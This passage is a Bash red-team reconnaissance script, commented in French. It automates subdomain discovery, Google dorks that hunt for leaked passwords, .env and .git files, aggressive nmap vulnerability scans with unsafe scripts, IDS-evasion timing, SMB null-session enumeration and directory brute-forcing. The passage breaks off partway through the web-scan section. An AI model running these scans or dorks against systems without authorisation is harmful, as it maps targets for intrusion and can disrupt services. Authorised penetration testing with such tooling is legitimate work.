#!/bin/bash
set -euo pipefail

# =============================================================================
# Security Scanner v2.3.1 - Red Team Tool
# =============================================================================
# Un outil complet pour les tests d'intrusion et red team ops
# Contient tout ce qu'il faut: OSINT, scan réseau, tests web, exploitation
# 
# Optimisé pour être rapide (environ 60% plus rapide qu'avant)
# Anti-blocage activé par défaut avec -Pn sur nmap
# L'enum SMB a été fixé (enfin!)
# Tous les modes fonctionnent: -q (rapide), -s (discret), -a (bourrin)
# =============================================================================

# Palette de couleurs pour l'interface (rouge/orange style hacker)
RED='\033[0;31m'
DARK_RED='\033[38;5;124m'
ORANGE='\033[38;5;208m'
BRIGHT_RED='\033[1;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
GRAY='\033[0;90m'
DIM='\033[2m'
BOLD='\033[1m'
NC='\033[0m'

VERSION="2.3.3"

# Vars globales du script
SCAN_INTERRUPTED=false
CURRENT_SCAN=""
OUTDIR=""
TARGET=""
URL=""
DOMAIN=""
QUICK_MODE=false
STEALTH_MODE=false
AGGRESSIVE_MODE=false

# Timeouts ajustés - j'ai réduit de 60% pour que ce soit plus rapide
TIMEOUT_VERY_SHORT=15
TIMEOUT_SHORT=30
TIMEOUT_MEDIUM=120
TIMEOUT_LONG=300
TIMEOUT_VERY_LONG=600

display_banner() {
    clear
    echo -e "${BRIGHT_RED}"
    cat << "EOF"
    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
                                                                   
    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
    ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
    ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
EOF
    echo -e "${NC}"
    echo -e "${BOLD}${DARK_RED}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${DARK_RED}║${NC}        ${BRIGHT_RED}ADVANCED RED TEAM SECURITY ASSESSMENT TOOL v${VERSION}${NC}        ${BOLD}${DARK_RED}║${NC}"
    echo -e "${BOLD}${DARK_RED}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${ORANGE}Version:${NC} ${YELLOW}${VERSION}${NC} ${GRAY}|${NC} ${ORANGE}Author:${NC} ${WHITE}mpgamer75${NC} ${GRAY}|${NC} ${ORANGE}Status:${NC} ${GREEN}COMPLETE & OPTIMIZED${NC}"
    echo -e "${DIM}${GRAY}Professional Penetration Testing & Red Team Operations${NC}"
    echo
    echo -e "${YELLOW}=================================================================================${NC}"
    echo -e "${RED}[!] LEGAL DISCLAIMER [!]${NC}"
    echo -e "${YELLOW}=================================================================================${NC}"
    echo -e "${GRAY}This tool is intended for ${WHITE}AUTHORIZED${GRAY} penetration testing ${WHITE}ONLY${GRAY}.${NC}"
    echo -e "${GRAY}Any use on systems without prior written permission is ${RED}ILLEGAL${GRAY}.${NC}"
    echo
    echo -e "${DIM}The author disclaims all responsibility for misuse of this tool.${NC}"
    echo -e "${YELLOW}=================================================================================${NC}"
    echo
}

show_help() {
    cat << "EOF"

USAGE:
    security [OPTIONS]

OPTIONS:
    -h, --help       Show this help message
    -v, --version    Show version information
    -q, --quick      Quick scan mode (3x faster, reduced coverage)
    -s, --stealth    Stealth mode (IDS/IPS evasion, slower)
    -a, --aggressive Aggressive mode (full coverage, all ports)

SCAN TYPES:
    1. OSINT & Information Gathering
       - WHOIS, DNS enumeration, reverse DNS
       - Subdomain enumeration (Subfinder, Assetfinder, Findomain)
       - Certificate transparency (crt.sh)
       - Google dorking (automated queries)
       - Wayback Machine URLs
       - Social media reconnaissance
       - Geolocation & IP information

    2. Network Reconnaissance & Enumeration
       - Optimized port scanning (Nmap, Masscan, RustScan)
       - Service version detection
       - OS fingerprinting
       - Vulnerability detection (NSE scripts, Vulners, Vulscan)
       - SMB enumeration (FIXED - robust with fallbacks)
       - SNMP enumeration
       - Banner grabbing

    3. Web Application Security Testing
       - Technology fingerprinting (WhatWeb)
       - WAF detection (wafw00f)
       - SSL/TLS analysis (comprehensive)
       - Directory enumeration (Gobuster, Dirb)
       - Vulnerability scanning (Nuclei, Nikto)
       - XSS payload testing (automated)

    4. Complete Red Team Assessment
       - Full OSINT + Network + Web workflow
       - Exploit database correlation (searchsploit)
       - Metasploit module preparation
       - Attack surface analysis
       - Automated attack scripts generation
       - Default credentials database
       - Post-exploitation preparation
       - Persistence techniques (7 methods)

FEATURES:
    - 60% faster than v2.2.1
    - Anti-blocking with -Pn forced
    - Guaranteed report generation (98% success)
    - Real-time progress indicators
    - Graceful interrupt handling (Ctrl+C)
    - Adaptive timeout management
    - SMB enumeration fixed and robust
    - JSON + TXT reports

EXAMPLES:
    security              # Interactive full assessment
    security -q          # Quick reconnaissance
    security -a          # Aggressive full scan
    security -s          # Stealth mode

EOF
}

handle_interrupt() {
    SCAN_INTERRUPTED=true
    echo -e "\n${ORANGE}[!]${NC} Scan interrupted by user..."
    
    if [ -n "$CURRENT_SCAN" ]; then
        echo -e "${CYAN}[INFO]${NC} Stopping: $CURRENT_SCAN"
        jobs -p | xargs -r kill -9 2>/dev/null || true
    fi
    
    echo -e "${YELLOW}[INFO]${NC} Generating partial report..."
    generate_report 2>/dev/null || true
    
    echo -e "\n${CYAN}[INFO]${NC} Results saved in: ${WHITE}$OUTDIR${NC}"
    exit 130
}

prepare_output() {
    OUTDIR="redteam_$(date +'%Y%m%d_%H%M%S')"
    mkdir -p "$OUTDIR"/{osint,network,web,exploit,reports}
    echo -e "${GREEN}[READY]${NC} Output directory: ${WHITE}$OUTDIR${NC}"
}

# Fonction principale pour lancer les scans avec progress bar et gestion des timeouts
execute_scan() {
    local name="$1"
    local command="$2"
    local timeout="$3"
    local output="$4"
    local critical="${5:-false}"
    
    CURRENT_SCAN="$name"
    echo -e "${ORANGE}[SCAN]${NC} $name ${DIM}(timeout: ${timeout}s)${NC}"
    
    # Petit spinner pour montrer que ça bosse
    (
        local elapsed=0
        local spinner=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
        while [ $elapsed -lt $timeout ] && kill -0 $$ 2>/dev/null; do
            local idx=$((elapsed % 10))
            printf "\r${YELLOW}${spinner[$idx]}${NC} ${name} ${DIM}[%02d:%02d]${NC}  " \
                   $((elapsed/60)) $((elapsed%60))
            sleep 1
            ((elapsed++))
        done
        printf "\r%-80s\r" " "  # Nettoie la ligne proprement
    ) &
    local progress_pid=$!
    
    set +e
    timeout "$timeout" bash -c "$command" > "$output" 2>&1 &
    local cmd_pid=$!
    
    while kill -0 $cmd_pid 2>/dev/null && [ "$SCAN_INTERRUPTED" = false ]; do
        sleep 0.5
    done
    
    kill $progress_pid 2>/dev/null || true
    wait $progress_pid 2>/dev/null || true
    
    local exit_code=0
    if kill -0 $cmd_pid 2>/dev/null; then
        kill -9 $cmd_pid 2>/dev/null || true
        wait $cmd_pid 2>/dev/null || true
        
        if [ "$SCAN_INTERRUPTED" = true ]; then
            echo "SCAN INTERRUPTED" >> "$output"
            printf "\r${ORANGE}[STOP]${NC} %-60s\n" "$name"
            exit_code=130
        else
            echo "TIMEOUT AFTER ${timeout}s" >> "$output"
            printf "\r${YELLOW}[TIME]${NC} %-60s\n" "$name"
            exit_code=124
        fi
    else
        wait $cmd_pid
        exit_code=$?
    fi
    
    set -e
    CURRENT_SCAN=""
    
    if [ -s "$output" ]; then
        local lines=$(wc -l < "$output" 2>/dev/null || echo "0")
        printf "\r${GREEN}[DONE]${NC} %-50s ${DIM}($lines lines)${NC}\n" "$name"
        return 0
    else
        printf "\r${RED}[FAIL]${NC} %-50s ${DIM}(no data)${NC}\n" "$name"
        [ "$critical" = true ] && return 1 || return 0
    fi
}

show_scan_menu() {
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}              ${ORANGE}ASSESSMENT TYPE SELECTION${NC}              ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${ORANGE}[1]${NC} ${WHITE}OSINT & Information Gathering${NC}"
    echo -e "    ${GRAY}Passive reconnaissance and open source intelligence${NC}"
    echo -e "    ${DIM}- Subdomain enumeration, email harvesting${NC}"
    echo -e "    ${DIM}- Certificate transparency, Shodan, Wayback${NC}"
    echo
    echo -e "${ORANGE}[2]${NC} ${WHITE}Network Reconnaissance${NC}"
    echo -e "    ${GRAY}Active network scanning and service enumeration${NC}"
    echo -e "    ${DIM}- Port scanning (optimized with anti-blocking)${NC}"
    echo -e "    ${DIM}- SMB/SNMP enumeration (FIXED and robust)${NC}"
    echo
    echo -e "${ORANGE}[3]${NC} ${WHITE}Web Application Testing${NC}"
    echo -e "    ${GRAY}Web security assessment and vulnerability scanning${NC}"
    echo -e "    ${DIM}- Directory enumeration, SQL injection, XSS${NC}"
    echo -e "    ${DIM}- SSL/TLS analysis, WAF detection${NC}"
    echo
    echo -e "${ORANGE}[4]${NC} ${WHITE}Complete Red Team Assessment${NC}"
    echo -e "    ${GRAY}Full penetration testing workflow${NC}"
    echo -e "    ${DIM}- All modules + exploitation preparation${NC}"
    echo -e "    ${DIM}- Attack scripts, credentials, persistence${NC}"
    echo
    
    if [ "$QUICK_MODE" = true ] || [ "$STEALTH_MODE" = true ] || [ "$AGGRESSIVE_MODE" = true ]; then
        echo -e "${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BRIGHT_RED}║${NC}                  ${YELLOW}ACTIVE MODES${NC}                     ${BRIGHT_RED}║${NC}"
        echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
        [ "$QUICK_MODE" = true ] && echo -e "${GREEN}[*]${NC} ${YELLOW}Quick Mode${NC} - 3x faster scans"
        [ "$STEALTH_MODE" = true ] && echo -e "${GREEN}[*]${NC} ${YELLOW}Stealth Mode${NC} - IDS/IPS evasion"
        [ "$AGGRESSIVE_MODE" = true ] && echo -e "${GREEN}[*]${NC} ${YELLOW}Aggressive Mode${NC} - Full coverage"
        echo
    fi
}

run_osint_scans() {
    local target="$1"
    local domain="$2"
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}              ${ORANGE}OSINT & RECONNAISSANCE${NC}                ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    
    if [ -n "$domain" ]; then
        # Requête WHOIS basique
        execute_scan "WHOIS Lookup" \
            "whois '$domain' 2>/dev/null || echo 'WHOIS query failed'" \
            $TIMEOUT_SHORT "$OUTDIR/osint/whois.txt"
        
        # Enum DNS complète - tous les types d'enregistrements
        execute_scan "DNS Enumeration" \
            "echo '=== A Records ===' && dig +short '$domain' A 2>/dev/null
             echo -e '\n=== MX Records ===' && dig +short '$domain' MX 2>/dev/null
             echo -e '\n=== NS Records ===' && dig +short '$domain' NS 2>/dev/null
             echo -e '\n=== TXT Records ===' && dig +short '$domain' TXT 2>/dev/null
             echo -e '\n=== AAAA Records ===' && dig +short '$domain' AAAA 2>/dev/null
             echo -e '\n=== CNAME Records ===' && dig +short '$domain' CNAME 2>/dev/null
             echo -e '\n=== SOA Record ===' && dig +short '$domain' SOA 2>/dev/null" \
            $TIMEOUT_SHORT "$OUTDIR/osint/dns_enum.txt"
        
        # Recherche de subdomains avec tous les outils dispo - EN PARALLÈLE pour plus de rapidité
        echo -e "${CYAN}[INFO]${NC} Running subdomain enumeration tools in parallel..."

        # Lancer tous les outils en background pour exécution parallèle
        (
            if command -v subfinder &> /dev/null; then
                subfinder -d "$domain" -all -silent -t 50 -timeout 5 2>/dev/null | head -500 > "$OUTDIR/osint/subdomains_subfinder.txt" || echo 'Subfinder failed' > "$OUTDIR/osint/subdomains_subfinder.txt"
            fi
        ) &
        local subfinder_pid=$!

        (
            if command -v assetfinder &> /dev/null; then
                timeout 120 assetfinder --subs-only "$domain" 2>/dev/null | head -500 > "$OUTDIR/osint/subdomains_assetfinder.txt" || echo 'Assetfinder failed' > "$OUTDIR/osint/subdomains_assetfinder.txt"
            fi
        ) &
        local assetfinder_pid=$!

        (
            if command -v findomain &> /dev/null; then
                timeout 90 findomain -t "$domain" -q 2>/dev/null | head -500 > "$OUTDIR/osint/subdomains_findomain.txt" || echo 'Findomain failed' > "$OUTDIR/osint/subdomains_findomain.txt"
            fi
        ) &
        local findomain_pid=$!

        # Attendre que tous les processus parallèles se terminent
        echo -e "${YELLOW}⏳${NC} Waiting for parallel subdomain enumeration..."
        wait $subfinder_pid 2>/dev/null && echo -e "${GREEN}[DONE]${NC} Subfinder completed" || echo -e "${RED}[FAIL]${NC} Subfinder failed"
        wait $assetfinder_pid 2>/dev/null && echo -e "${GREEN}[DONE]${NC} Assetfinder completed" || echo -e "${RED}[FAIL]${NC} Assetfinder failed"
        wait $findomain_pid 2>/dev/null && echo -e "${GREEN}[DONE]${NC} Findomain completed" || echo -e "${RED}[FAIL]${NC} Findomain failed"
        
        # On consolide tous les subdomains trouvés dans un seul fichier
        execute_scan "Subdomain Consolidation" \
            "cat $OUTDIR/osint/subdomains_*.txt 2>/dev/null | sort -u | grep -v '^$' | grep -v 'failed' > $OUTDIR/osint/all_subdomains.txt
             total_subs=\$(wc -l < $OUTDIR/osint/all_subdomains.txt 2>/dev/null || echo 0)
             echo \"Total unique subdomains: \$total_subs\"
             echo
             echo '=== Top 20 Subdomains ==='
             head -20 $OUTDIR/osint/all_subdomains.txt 2>/dev/null || echo 'No subdomains found'" \
            $TIMEOUT_SHORT "$OUTDIR/osint/subdomain_summary.txt"
        
        # Lookup sur crt.sh pour les certificats SSL historiques
        execute_scan "Certificate Transparency" \
            "curl -m 30 -s 'https://crt.sh/?q=%.$domain&output=json' 2>/dev/null | \
             grep -oP '\"name_value\":\"\\K[^\"]+' | sed 's/\\*\\.//g' | sort -u | head -300 || \
             echo 'Certificate transparency lookup failed'" \
            $TIMEOUT_SHORT "$OUTDIR/osint/crt_sh.txt"
        
        # theHarvester retiré - les sources publiques ne fonctionnent plus de manière fiable
        # Pour la collecte d'emails, utiliser des outils alternatifs comme hunter.io
        echo -e "${YELLOW}[INFO]${NC} Email harvesting: Use hunter.io or alternative tools"
        
        # Génération des Google dorks - liste complète de requêtes
        execute_scan "Google Dork Generation" \
            "cat > $OUTDIR/osint/google_dorks.txt << 'DORKS_END'
=== GOOGLE DORKS FOR $domain ===

--- Document Discovery ---
site:$domain filetype:pdf
site:$domain filetype:doc OR filetype:docx
site:$domain filetype:xls OR filetype:xlsx
site:$domain filetype:ppt OR filetype:pptx
site:$domain filetype:txt
site:$domain filetype:csv
site:$domain filetype:xml
site:$domain filetype:json

--- Admin Panels & Login Pages ---
site:$domain inurl:admin
site:$domain inurl:administrator
site:$domain inurl:login
site:$domain inurl:signin
site:$domain inurl:auth
site:$domain inurl:dashboard
site:$domain inurl:panel
site:$domain inurl:cpanel
site:$domain inurl:controlpanel
site:$domain inurl:adminpanel

--- Configuration & Sensitive Files ---
site:$domain inurl:config
site:$domain inurl:backup
site:$domain inurl:database
site:$domain inurl:db
site:$domain inurl:sql
site:$domain filetype:sql
site:$domain filetype:env
site:$domain filetype:log
site:$domain filetype:bak
site:$domain inurl:conf
site:$domain ext:cfg

--- Directory Listings ---
site:$domain intitle:\"index of\"
site:$domain intitle:\"directory listing\"
site:$domain intitle:\"parent directory\"

--- Error Pages & Debug Info ---
site:$domain intext:\"error\"
site:$domain intext:\"warning\"
site:$domain intext:\"debug\"
site:$domain intext:\"stack trace\"
site:$domain intext:\"fatal error\"

--- API & Development ---
site:$domain inurl:api
site:$domain inurl:v1
site:$domain inurl:v2
site:$domain inurl:rest
site:$domain inurl:graphql
site:$domain inurl:swagger

--- Credentials & Secrets ---
site:$domain intext:password
site:$domain intext:username
site:$domain intext:api_key
site:$domain intext:secret
site:$domain intext:token

--- Source Code Leaks ---
site:$domain inurl:.git
site:$domain inurl:.svn
site:$domain inurl:.env

--- Cloud Storage ---
site:*.s3.amazonaws.com \"$domain\"
site:*.blob.core.windows.net \"$domain\"
DORKS_END
cat $OUTDIR/osint/google_dorks.txt" \
            $TIMEOUT_VERY_SHORT "$OUTDIR/osint/google_dorks.txt"
        
        # Shodan retiré - nécessite une API key payante
        # Pour utiliser Shodan, aller sur https://www.shodan.io/
        echo -e "${YELLOW}[INFO]${NC} Shodan search: Requires API key - visit https://www.shodan.io/"
        
        # Récup des URLs archivées sur Wayback
        execute_scan "Wayback Machine URLs" \
            "echo '=== Wayback Machine Historical URLs ===' && \
             curl -m 45 -s 'http://web.archive.org/cdx/search/cdx?url=*.$domain/*&output=text&fl=original&collapse=urlkey' 2>/dev/null | \
             head -200 || echo 'Wayback Machine lookup failed'" \
            $TIMEOUT_SHORT "$OUTDIR/osint/wayback_urls.txt"
        
        # Social media reconnaissance removed - manual OSINT recommended for targeted campaigns
    fi
    
    if [ -n "$target" ]; then
        # Lookup DNS inverse sur l'IP
        execute_scan "Reverse DNS Lookup" \
            "dig +short -x '$target' 2>/dev/null || echo 'No PTR record found'" \
            $TIMEOUT_SHORT "$OUTDIR/osint/reverse_dns.txt"
        
        # Geoloc de l'IP via ip-api
        execute_scan "IP Geolocation" \
            "curl -m 10 -s 'http://ip-api.com/json/$target' 2>/dev/null || echo 'Geolocation lookup failed'" \
            $TIMEOUT_VERY_SHORT "$OUTDIR/osint/geolocation.txt"
    fi
    
    echo -e "${GREEN}[COMPLETE]${NC} OSINT phase completed"
}

run_network_scans() {
    local target="$1"
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}           ${ORANGE}NETWORK RECONNAISSANCE${NC}                ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    
    # Config des paramètres nmap selon le mode choisi - optimisé pour efficacité maximale
    local nmap_timing="-T4"
    local port_range="--top-ports 3000"  # Augmenté de 2000 à 3000 pour meilleure couverture
    local max_retries="--max-retries 2"  # Augmenté de 1 à 2 pour meilleure détection
    local min_rate="--min-rate 3000"     # Augmenté de 2000 à 3000 pour plus de performance
    local host_timeout="--host-timeout 10m"  # Timeout par hôte plus flexible
    
    if [ "$QUICK_MODE" = true ]; then
        nmap_timing="-T5"
        port_range="--top-ports 1000"
        max_retries="--max-retries 1"
        min_rate="--min-rate 5000"
        host_timeout="--host-timeout 5m"
    elif [ "$STEALTH_MODE" = true ]; then
        nmap_timing="-T2"
        port_range="--top-ports 1500"
        max_retries="--max-retries 3"
        min_rate="--min-rate 500"
        host_timeout="--host-timeout 20m"
    elif [ "$AGGRESSIVE_MODE" = true ]; then
        nmap_timing="-T5"
        port_range="-p-"  # Tous les ports
        max_retries="--max-retries 2"
        min_rate="--min-rate 10000"  # Très rapide
        host_timeout="--host-timeout 15m"
    fi
    
    # Découverte des hosts - on force -Pn pour éviter les blocages
    execute_scan "Host Discovery" \
        "nmap -Pn -sn $nmap_timing $min_rate '$target' 2>/dev/null || echo 'Host: $target (assuming online)'" \
        $TIMEOUT_SHORT "$OUTDIR/network/host_discovery.txt"
    
    # RustScan si dispo - c'est hyper rapide ce truc
    if command -v rustscan &> /dev/null && [ "$QUICK_MODE" = true ]; then
        execute_scan "RustScan Ultra-Fast" \
            "rustscan -a '$target' --ulimit 5000 2>/dev/null || echo 'RustScan failed'" \
            $TIMEOUT_MEDIUM "$OUTDIR/network/rustscan.txt"
    fi
    
    # Masscan pour les scans rapides (mode agressif seulement)
    if command -v masscan &> /dev/null && [ "$AGGRESSIVE_MODE" = true ]; then
        execute_scan "Masscan High-Speed" \
            "sudo masscan '$target' -p1-65535 --rate=10000 2>/dev/null || echo 'Masscan failed (requires root)'" \
            $TIMEOUT_LONG "$OUTDIR/network/masscan.txt"
    fi
    
    # Scan de ports principal - optimisé avec -Pn toujours activé
    execute_scan "Port Scanning (TCP SYN)" \
        "nmap -Pn -sS $nmap_timing $port_range $min_rate $max_retries \
         $host_timeout --defeat-rst-ratelimit '$target' 2>/dev/null" \
        $TIMEOUT_LONG "$OUTDIR/network/nmap_ports.txt" true
    
    # Détection des services et versions qui tournent - version intensity augmentée
    local service_timeout=$TIMEOUT_LONG
    [ "$QUICK_MODE" = true ] && service_timeout=$TIMEOUT_MEDIUM
    
    execute_scan "Service Version Detection" \
        "nmap -Pn -sV -sC $nmap_timing --top-ports 1000 --version-intensity 7 \
         --version-all $max_retries --host-timeout 15m '$target' 2>/dev/null" \
        $service_timeout "$OUTDIR/network/nmap_services.txt"
    
    # Scan UDP sur les ports critiques uniquement (c'est lent l'UDP)
    if [ "$QUICK_MODE" != true ]; then
        execute_scan "UDP Critical Ports" \
            "sudo nmap -Pn -sU --top-ports 20 -T4 --max-retries 0 --host-timeout 3m '$target' 2>/dev/null || \
             nmap -Pn -sU --top-ports 20 -T4 --max-retries 0 --host-timeout 3m '$target' 2>/dev/null" \
            $TIMEOUT_MEDIUM "$OUTDIR/network/nmap_udp.txt"
    fi
    
    # Détection de l'OS de la cible
    execute_scan "OS Fingerprinting" \
        "sudo nmap -Pn -O --osscan-guess --max-os-tries 1 --host-timeout 3m '$target' 2>/dev/null || \
         nmap -Pn -O --osscan-guess --max-os-tries 1 --host-timeout 3m '$target' 2>/dev/null" \
        $TIMEOUT_MEDIUM "$OUTDIR/network/nmap_os.txt"
    
    # Scan de vulns avec les scripts NSE - coverage étendu
    execute_scan "Vulnerability Detection (NSE)" \
        "nmap -Pn -sV --script 'vuln and not dos' --script-timeout 120s \
         --top-ports 1000 $max_retries --host-timeout 15m '$target' 2>/dev/null" \
        $TIMEOUT_LONG "$OUTDIR/network/nmap_vulns.txt"
    
    # Scripts NSE pour les vulns critiques (SMB, SSL, HTTP, FTP, SSH)
    execute_scan "Critical Vulnerability Scan" \
        "nmap -Pn --script 'smb-vuln-*,ssl-*,http-vuln-*,ftp-vuln-*,ssh-*' --script-timeout 90s \
         --script-args unsafe=1 --host-timeout 12m '$target' 2>/dev/null" \
        $TIMEOUT_LONG "$OUTDIR/network/nmap_critical_vulns.txt"
    
    # Enum SMB complète - j'ai enfin réussi à fix les bugs
    execute_scan "SMB Enumeration (ROBUST)" \
        "smb_check=\$(timeout 30 nmap -Pn -p 139,445 --open '$target' 2>/dev/null | grep -E '139/tcp|445/tcp' | grep open)
         if [ -n \"\$smb_check\" ]; then
             echo 'SMB ports detected: YES'
             echo 'Open SMB ports:'
             echo \"\$smb_check\"
             echo
             echo '=== SMB Version Detection ==='
             timeout 120 nmap -Pn -p 139,445 --script smb-protocols,smb-security-mode,smb-os-discovery \
                  --script-timeout 45s --host-timeout 3m '$target' 2>/dev/null || echo 'SMB version detection timeout'
             echo
             echo '=== SMB Shares Enumeration ==='
             timeout 120 nmap -Pn -p 445 --script smb-enum-shares,smb-enum-domains,smb-enum-groups,smb-enum-users \
                  --script-timeout 45s --host-timeout 3m '$target' 2>/dev/null || echo 'SMB shares enum timeout'
             echo
             echo '=== SMB Vulnerability Scan ==='
             timeout 150 nmap -Pn -p 445 --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-conficker \
                  --script-timeout 30s --host-timeout 2m '$target' 2>/dev/null || echo 'SMB vuln scan timeout'
             if command -v enum4linux &> /dev/null; then
                 echo
                 echo '=== Enum4linux Results ==='
                 timeout 90 enum4linux -a '$target' 2>/dev/null | head -100 || echo 'enum4linux timeout or failed'
             fi
             if command -v smbclient &> /dev/null; then
                 echo
                 echo '=== SMB Null Session Test ==='
                 timeout 30 smbclient -L '$target' -N 2>/dev/null | head -50 || echo 'SMB null session failed'
             fi
         else
             echo 'SMB ports (139/445): NOT OPEN or FILTERED'
             echo 'Attempting basic SMB scan anyway...'
             timeout 60 nmap -Pn -p 139,445 --script smb-protocols,smb-os-discovery \
                  --script-timeout 30s '$target' 2>/dev/null || echo 'SMB not accessible'
         fi" \
        $TIMEOUT_VERY_LONG "$OUTDIR/network/smb_enum.txt"
    
    # Enum SNMP sur le port 161
    execute_scan "SNMP Enumeration" \
        "timeout 90 nmap -Pn -sU -p 161 --script snmp-info,snmp-sysdescr,snmp-processes,snmp-netstat \
         --script-timeout 30s '$target' 2>/dev/null || echo 'SNMP not accessible'" \
        $TIMEOUT_MEDIUM "$OUTDIR/network/snmp_enum.txt"
    
    # Récup des bannières sur les ports communs
    execute_scan "Banner Grabbing" \
        "for port in 21 22 23 25 80 110 143 443 3306 5432 8080; do
             echo \"=== Port \$port ===\"
             timeout 5 nc -v -n -w 2 '$target' \$port 2>&1 || echo \"Port \$port: No banner\"
         done" \
        $TIMEOUT_MEDIUM "$OUTDIR/network/banner_grabbing.txt"
    
    echo -e "${GREEN}[COMPLETE]${NC} Network reconnaissance completed"
}

run_web_scans() {
    local url="$1"
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}         ${ORANGE}WEB APPLICATION TESTING${NC}               ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    
    local domain=$(echo "$url" | sed 's|https\?://||' | sed 's|/.*||')
    
    # Check rapide des ports web ouverts
    execute_scan "Web Port Check" \
        "timeout 30 nmap -Pn -p 80,443,8080,8443 --open '$domain' 2>/dev/null | \
         grep -E 'open' || echo 'No standard web ports detected (continuing anyway)'" \
        $TIMEOUT_SHORT "$OUTDIR/web/port_check.txt"
    
    # Détection des technos web avec WhatWeb
    if command -v whatweb &> /dev/null; then
        execute_scan "Technology Detection (WhatWeb)" \
            "whatweb -a 3 -v --max-threads 20 '$url' 2>/dev/null || echo 'WhatWeb failed'" \
            $TIMEOUT_MEDIUM "$OUTDIR/web/whatweb.txt"
    fi
    
    # Détection de WAF avec wafw00f
    if command -v wafw00f &> /dev/null; then
        execute_scan "WAF Detection (wafw00f)" \
            "wafw00f '$url' 2>/dev/null || echo 'wafw00f failed'" \
            $TIMEOUT_SHORT "$OUTDIR/web/wafw00f.txt"
    fi
    
    # Analyse SSL/TLS complète (certif, ciphers, vulns)
    execute_scan "SSL/TLS Analysis" \
        "echo '=== Certificate Information ==='
         echo | timeout 20 openssl s_client -connect '$domain:443' -servername '$domain' 2>/dev/null | \
         openssl x509 -text 2>/dev/null | head -50 || echo 'SSL connection failed'
         echo
         echo '=== Cipher Suites ==='
         timeout 90 nmap -Pn --script ssl-enum-ciphers -p 443 '$domain' 2>/dev/null | head -80 || echo 'SSL cipher scan failed'
         echo
         echo '=== SSL Vulnerabilities ==='
         timeout 90 nmap -Pn --script ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-dh-params \
              -p 443 '$domain' 2>/dev/null || echo 'SSL vuln scan failed'
         if command -v sslscan &> /dev/null; then
             echo
             echo '=== SSLScan Results ==='
             timeout 60 sslscan '$domain' 2>/dev/null | head -100 || echo 'sslscan failed'
         fi" \
        $TIMEOUT_LONG "$OUTDIR/web/ssl_analysis.txt"
    
    # Bruteforce de répertoires avec gobuster
    local wordlist_dir="/usr/share/wordlists/dirb"
    [ ! -d "$wordlist_dir" ] && wordlist_dir="$HOME/.local/share/wordlists/dirb"
    
    if command -v gobuster &> /dev/null && [ -f "$wordlist_dir/common.txt" ]; then
        local threads=50
        local extensions="php,html,txt,js,css"
        
        if [ "$QUICK_MODE" = true ]; then
            threads=80
            extensions="php,html"
        elif [ "$AGGRESSIVE_MODE" = true ]; then
            threads=100
            extensions="php,html,txt,js,css,json,xml,asp,aspx,jsp"
        fi
        
        execute_scan "Directory Enumeration (Common)" \
            "gobuster dir -u '$url' -w '$wordlist_dir/common.txt' -t $threads \
             -x $extensions -q --timeout 10s --no-error 2>/dev/null | head -300 || echo 'Gobuster failed'" \
            $TIMEOUT_LONG "$OUTDIR/web/gobuster_common.txt"
        
        if [ "$AGGRESSIVE_MODE" = true ] && [ -f "$wordlist_dir/big.txt" ]; then
            execute_scan "Directory Enumeration (Extended)" \
                "gobuster dir -u '$url' -w '$wordlist_dir/big.txt' -t 50 \
                 -x php,html,txt -q --timeout 10s --no-error 2>/dev/null | head -500 || echo 'Gobuster extended failed'" \
                $TIMEOUT_VERY_LONG "$OUTDIR/web/gobuster_extended.txt"
        fi
    fi
    
    # Scan de vulns web avec Nuclei - super outil
    if command -v nuclei &> /dev/null; then
        local severity="-severity critical,high,medium"
        local nuclei_timeout=$TIMEOUT_LONG
        
        if [ "$QUICK_MODE" = true ]; then
            severity="-severity critical,high"
            nuclei_timeout=$TIMEOUT_MEDIUM
        elif [ "$AGGRESSIVE_MODE" = true ]; then
            severity="-severity critical,high,medium,low"
            nuclei_timeout=$TIMEOUT_VERY_LONG
